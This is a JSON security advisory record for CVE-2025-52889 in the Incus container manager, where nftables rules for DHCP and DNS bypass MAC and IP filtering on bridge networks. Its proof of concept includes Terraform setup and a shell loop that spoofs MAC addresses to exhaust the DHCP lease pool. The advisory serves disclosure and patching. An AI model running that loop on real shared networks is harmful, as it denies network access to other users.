{
  "Severity": "LOW",
  "UpdatedAt": "2025-06-28T00:09:13Z",
  "Package": {
    "Ecosystem": "GO",
    "Name": "github.com/lxc/incus/v6"
  },
  "Advisory": {
    "DatabaseId": 300682,
    "Id": "GSA_kwCzR0hTQS05cTdjLXFtaG0tanY4Ns4ABJaK",
    "GhsaId": "GHSA-9q7c-qmhm-jv86",
    "References": [
      {
        "Url": "https://github.com/lxc/incus/security/advisories/GHSA-9q7c-qmhm-jv86"
      },
      {
        "Url": "https://nvd.nist.gov/vuln/detail/CVE-2025-52889"
      },
      {
        "Url": "https://github.com/lxc/incus/commit/2516fb19ad8428454cb4edfe70c0a5f0dc1da214"
      },
      {
        "Url": "https://github.com/lxc/incus/commit/a7c33301738aede3c035063e973b1d885d9bac7c"
      },
      {
        "Url": "https://github.com/advisories/GHSA-9q7c-qmhm-jv86"
      }
    ],
    "Identifiers": [
      {
        "Type": "GHSA",
        "Value": "GHSA-9q7c-qmhm-jv86"
      },
      {
        "Type": "CVE",
        "Value": "CVE-2025-52889"
      }
    ],
    "Description": "### Summary\n\nWhen using an ACL on a device connected to a bridge, Incus generates nftables rules for local services (DHCP, DNS...) that partially bypass security options `security.mac_filtering`, `security.ipv4_filtering` and `security.ipv6_filtering`. This can lead to DHCP pool exhaustion and opens the door for other attacks.\n\n### Details\n\nIn commit a7c33301738aede3c035063e973b1d885d9bac7c, the following rules are added at the top of the bridge input chain:\n\n\tiifname \"{{.hostName}}\" ether type ip ip saddr 0.0.0.0 ip daddr 255.255.255.255 udp dport 67 accept\n\tiifname \"{{.hostName}}\" ether type ip6 ip6 saddr fe80::/10 ip6 daddr ff02::1:2 udp dport 547 accept\n\tiifname \"{{.hostName}}\" ether type ip6 ip6 saddr fe80::/10 ip6 daddr ff02::2 icmpv6 type 133 accept\n\nHowever, these rules accept packets that should be filtered and maybe dropped by later rules in the \"MAC filtering\" snippet:\n\n\tiifname \"{{.hostName}}\" ether type arp arp saddr ether != {{.hwAddr}} drop\n\tiifname \"{{.hostName}}\" ether type ip6 icmpv6 type 136 @nh,528,48 != {{.hwAddrHex}} drop\n\nTherefore, the MAC filtering is ineffective on those new rules. This allows an attacker to request as many IP as they want by sending a lot of DHCP requests with different MAC addresses. Doing so, they can exhaust the DHCP pool, resulting in a DoS of the bridge's network.\n\nAdditionaly, the commit adds non-restricted access to the local dnsmasq DNS server:\n\n\t{{ if .dnsIPv4 }}\n\t{{ range .dnsIPv4 }}\n\tiifname \"{{$.hostName}}\" ip daddr \"{{.}}\" tcp dport 53 accept\n\tiifname \"{{$.hostName}}\" ip daddr \"{{.}}\" udp dport 53 accept\n\t{{ end }}\n\t{{ end }}\n\n\t{{ if .dnsIPv6 }}\n\t{{ range .dnsIPv6 }}\n\tiifname \"{{$.hostName}}\" ip6 daddr \"{{.}}\" tcp dport 53 accept\n\tiifname \"{{$.hostName}}\" ip6 daddr \"{{.}}\" udp dport 53 accept\n\t{{ end }}\n\t{{ end }}\n\nAn attacker can send DNS requests with arbitrary MAC and IP addresses as well. These rules should also be after the MAC/IPv4/IPv6 filtering.\n\n### PoC\n\nWith this terraform infrastructure:\n\n```\nresource \"incus_network_acl\" \"acl_allow_out\" {\n  name    = \"acl-allow-out\"\n  egress = [\n    {\n      action           = \"allow\"\n      destination      = \"0.0.0.0-9.255.255.255,11.0.0.0-172.15.255.255,172.32.0.0-192.167.255.255,192.169.0.0-255.255.255.254\"\n      state            = \"enabled\"\n    },\n  ]\n}\nresource \"incus_network_acl\" \"acl_allow_in\" {\n  name    = \"acl-allow-in\"\n  ingress = [\n    {\n      action           = \"allow\"\n      state            = \"enabled\"\n    },\n  ]\n}\n\nresource \"incus_network\" \"br0\" {\n  name = \"br0\"\n  config = {\n    \"ipv4.address\"          = \"10.0.0.1/24\"\n    \"ipv4.nat\"              = \"true\"\n  }\n}\n\nresource \"incus_instance\" \"machine1\" {\n  name  = \"machine1\"\n  image = \"images:archlinux/cloud\"\n  type = \"virtual-machine\"\n  config = {\n    \"limits.memory\" = \"2GiB\"\n    \"security.secureboot\" = false\n    \"boot.autostart\" = false\n    \"cloud-init.vendor-data\" = \u003c\u003c-EOF\n      #cloud-config\n      package_update: true\n      packages:\n        - dhclient\n        - tcpdump\n      runcmd:\n        - systemctl disable --now systemd.networkd.service\n        - systemctl disable --now systemd.networkd.socket\n    EOF\n  }\n  device {\n    type = \"disk\"\n    name = \"root\"\n    properties = {\n      pool = \"default\"\n      path = \"/\"\n      size = \"64GiB\"\n    }\n  }\n  device {\n    type = \"nic\"\n    name = \"eth0\"\n    properties = {\n      network = incus_network.br0.name\n      \"security.ipv4_filtering\" = true\n      \"security.acls\" = join(\",\",\n        [\n          incus_network_acl.acl_allow_out.name,\n          incus_network_acl.acl_allow_in.name,\n        ])\n    }\n  }\n}\n\nresource \"incus_instance\" \"machine2\" {\n  name  = \"machine2\"\n  image = \"images:archlinux/cloud\"\n  type = \"virtual-machine\"\n  config = {\n    \"limits.memory\" = \"2GiB\"\n    \"security.secureboot\" = false\n    \"boot.autostart\" = false\n  }\n  device {\n    type = \"disk\"\n    name = \"root\"\n    properties = {\n      pool = \"default\"\n      path = \"/\"\n      size = \"64GiB\"\n    }\n  }\n  device {\n    type = \"nic\"\n    name = \"eth0\"\n    properties = {\n      network = incus_network.br0.name\n    }\n  }\n}\n```\n\nAn attacker in a VM requests many IP addresses and exhaust the pool:\n\n```bash\n[MACHINE1]$ for i in {0..99}; do for j in {0..99}; do ip link set address 10:66:6a:42:${i}:${j} dev enp5s0 ; dhclient -4 -i --no-pid ; done ; done\n\n[HOST]$ cat /var/lib/incus/networks/br0/dnsmasq.leases  |wc -l\n254\n\n[HOST]$ incus start machine2\n```\n\nAt this point, machine2 will not receive a lease from dnsmasq until another lease expires. If machine1 renews their malicious leases, machine2 will never get a lease.\n\n### Impact\n\nAll versions since a7c33301738aede3c035063e973b1d885d9bac7c, so basically v6.12 and v6.13.",
    "Origin": "UNSPECIFIED",
    "PublishedAt": "2025-06-26T21:11:09Z",
    "Severity": "LOW",
    "Summary": "Incus Allocation of Resources Without Limits allows firewall rule bypass on managed bridge networks",
    "UpdatedAt": "2025-06-28T00:09:13Z",
    "WithdrawnAt": "",
    "CVSS": {
      "Score": 3.4,
      "VectorString": "CVSS:3.1/AV:A/AC:L/PR:H/UI:N/S:C/C:N/I:N/A:L"
    }
  },
  "Versions": [
    {
      "FirstPatchedVersion": {
        "Identifier": "6.14"
      },
      "VulnerableVersionRange": "\u003e= 6.12, \u003c= 6.13"
    }
  ]
}